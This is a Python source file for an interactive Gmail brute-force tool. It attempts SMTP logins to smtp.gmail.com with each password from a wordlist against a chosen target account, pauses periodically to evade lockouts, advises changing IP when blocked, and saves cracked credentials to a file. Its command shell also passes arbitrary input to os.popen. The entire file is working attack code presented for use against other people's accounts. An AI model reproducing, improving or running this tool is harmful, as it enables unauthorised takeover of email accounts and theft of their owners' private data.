import smtplib , os , sys , time
import sys
import os
import time
from termcolor import colored

r="\x1b[91;1m"
g="\x1b[32;1m"
y="\x1b[33;1m"
p="\x1b[34;1m"
c="\x1b[36;1m"
o="\x1b[37;1m"
w="\x1b[00m"
u="\x1b[4m"
b="\x1b[5m"

Count = 0
_Count = 0

def Banner():
	Ban = " "+r+"\n\t\t\t\n⢀⣠⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀\n⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷\n⣿⣿⣿⡿⠛⠉⠉⠙⠿⣿⣿⣿⣿⠿⠋⠉⠉⠛⢿⣿⣿⣿\n⣿⣿⣿⣶⣿⣿⣿⣦⠀⢘⣿⣿⡃⠀⣴⣿⣿⣿⣶⣿⣿⣿\n⣿⣿⣿⣏⠉⠀⠈⣙⣿⣿⣿⣿⣿⣿⣋⠁⠀⠉⣹⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⢸⣿⣿⣎⠻⣿⣿⣿⣿⡿⠋⠙⢿⣿⣿⣿⣿⠟⣱⣿⣿⡇\n ⢿⣿⣿⣧⠀⠉⠉⠉⠀⢀⡀⠀⠉⠉⠉⠀⣼⣿⣿⡿⠀\n ⠈⢻⣿⣿⣷⣶⣶⣶⣶⣿⣿⣶⣶⣶⣶⣾⣿⣿⡟⠁\n   ⠹⣿⣿⣿⣿⣿⣿⠉⠉⣿⣿⣿⣿⣿⣿⠏\n    ⠈⠻⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠟⠁\n       ⠙⠻⢿⣦⣴⡿⠟⠋\n\n"+w+"\n  ▄████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████ \n ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ \n▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   \n░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ \n░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒\n ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░\n  ░   ░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░\n░ ░   ░ ░      ░     ░   ▒    ▒ ░  ░ ░       ░    ░   ░░   ░  ░░░ ░ ░   ░         ░   \n  ░        ░         ░  ░ ░      ░  ░    ░         ░        ░                 ░  ░\n\t\t\t"; print(Ban)

def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
	with open('{0}'.format(Passlist),'r') as PasswordsFile:
		for Password in PasswordsFile:
			Password = Password.rstrip("\n")
			try:
				SMTPServer.login(account,Password)
				print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
				
				# Create Data File!
				with open('credits.txt' , 'a') as DataFile:
					DataFile.write("\n--------------------------------------->"); DataFile.write(" "+g+"[!]"+r+" Email Target: {0}\n".format(account)); DataFile.write(" "+g+"[!]"+r+" Password nya nih bro: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
				exit()
			except smtplib.SMTPAuthenticationError:
				Count += 1; _Count += 1
				if Count == 20:
					print(" "+c+"[!]"+r+"\n Take a break bro, I'm tired, I'm just for {0} seconds 😅.".format(str(Time))); time.sleep(int(Time)); Count = 0
					SMTPServer.close()

					SMTPServer = StartSMTPServiceForGmail()
				else:
					print("\rgetting account: {0}".format(Password + "   ") , end="")
					sys.stdout.flush()
			except Exception as e:
				if "please run connect() first" in str(e):
					SMTPServer.close()
					print("\nSMTP Server Disconnected. Please Run the Tool Again After Changing Your IP Address Or After Waiting For Some Time"); exit()
				else:
					print("Error: " + str(e))

def StartSMTPServiceForGmail():
	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
	SMTPServer.ehlo()
	SMTPServer.starttls()
	return SMTPServer

def HelpGuide():
	print("\n👋  - Help Guide For To use.")
	print("List command:")
	print("\thelp\t\t"+c+">>"+r+"\tTo show This message")
	print("\tset target\t"+c+">>"+r+"\tto set the target you want")
	print("\tset time\t"+c+">>"+r+"\tto set the time or delay at least 10")
	print("\tset list\t"+c+">>"+r+"\tPw list name like /home/../PassList.txt ")
	print("\tshow target\t"+c+">>"+r+"\tto show you target")
	print("\tshow time\t"+c+">>"+r+"\tto show you delay")
	print("\tshow list\t"+c+">>"+r+"\tto  show list file")
	print("\tload\t\t"+c+">>"+r+"\tto use existing settings via path")
	print("\tstart\t\t"+c+">>"+r+"\tto start brute\n")
	print("\texit\t\t"+c+">>"+r+"\tto exit")

def ContactMe():
	Gmail =  "ryanzx0o0@gmail.com" # Don't perform the brute-force attacks on my email.

def StartShell():
	# store how many times the user pressed Ctrl + C
	AbortCount = 0
	Commands = []
	Account = ''
	Time = ''
	PassList = ''
	with open(os.path.join("data" , "Commands") ,'r') as CommandsFile:
		for Command in CommandsFile:
			Command = Command.rstrip("\n")
			Commands.append(Command)
	while True:
		# init variable to store user input
		ShellResponse = ''
		try:
			# get input from user
			ShellResponse = input(c+"[+]"+r+"root@DappyNet😎 : ")

		# handle Ctrl + C
		except KeyboardInterrupt:
			# increment AbortCount
			AbortCount += 1
			# print \n to print the new shell line on the next line
			print()
			# if the user pressed Ctrl + C two times
			if AbortCount >= 2:
				# print hint
				print("[!] Press Ctrl + D or enter 'exit' to abort the program.")
				# reset abortcount
				AbortCount = 0
			continue
		# handle Ctrl + D
		# Ctrl + D normally indicated the end of a file
		# this is why python throws an EOFError
		except EOFError:
			print()
			exit()

		if ShellResponse.lower().replace(' ' , '') not in Commands:
			if "s-" in ShellResponse.lower():
				Command = ShellResponse.split("-"); Command = Command[1]
				Results = os.popen(Command).read()
				print("Command:" + Command)
				print("Results: \n{0}".format(Results))
			else:
				print("Can't find the command: '{0}'".format(ShellResponse))
		elif ShellResponse.lower() == "help":
			HelpGuide()
		elif ShellResponse.lower().replace(' ' , '') == "settarget":
			Account = input("Target: ")
		elif ShellResponse.lower().replace(' ' , '') == "settime":
			Time = input("Time: ")
		elif ShellResponse.lower().replace(' ' , '') == "setlist":
			PassList = input("List: ")
		elif ShellResponse.lower().replace(' ' , '') == "showtarget":
			if Account == '':
				print(" "+c+"[?]"+r+" You haven't given a target bro ☹️")
			else:
				print("Target: " + Account)
		elif ShellResponse.lower().replace(' ' , '') == "showtime":
			if Time == '':
				print(" "+c+"[?]"+r+" you haven't given me a delay bro 🤔")
			else:
				print(" "+c+"[?]"+r+"Time: " + Time)
		elif ShellResponse.lower().replace(' ' , '') == "showlist":
			if PassList == '':
				print(" "+c+"[?]"+r+" You didn't put the file bro 😔")
			else:
				print("List: " + PassList)
		elif ShellResponse.lower() == "start":
			StartSMTPServiceForGmail()
			Service = StartSMTPServiceForGmail()
			if Account == '':
				print(" "+c+"[!]"+r+" Getting Target!")
				break
			elif PassList == '':
				print(" "+c+"[!]"+r+" Getting List!")
				break
			elif Time == '':
				print(" "+c+"[!]"+r+" Getting Delay[time]!")
				break
			else:
				StartBruteAccount(PassList,Account,Service,Count,_Count,Time)
		elif ShellResponse.lower() == "exit":
			exit()
		elif ShellResponse.lower() == "load":
			Config = input("list path config?: ")
			if os.path.exists(Config):
				Settings = open(Config , 'r')

				for Line in Settings:
					Line = Line.rstrip("\n"); Options = Line.split(":")

					try:
						if Options[0] == "email":
							Account = Options[1]
							print("Target: {0}".format(Options[1]))
						elif Options[0] == "list":
							PassList = Options[1]
							print("List: {0}".format(PassList))
						elif Options[0] == "time":
							Time = Options[1]
							print("Time: {0}".format(Time))
						else:
							print(" "+c+"[-]"+r+" you're right bro, there's no file, mate 🤔")
					except Exception:
						print(" "+c+"[-]"+r+" I can't read this bro, try again 😁")
			else:
				print(" "+c+"[-]"+r+" I don't have the file bro, I can't find it again, try!!")
		else:
			pass


# Start
Banner()
StartShell()
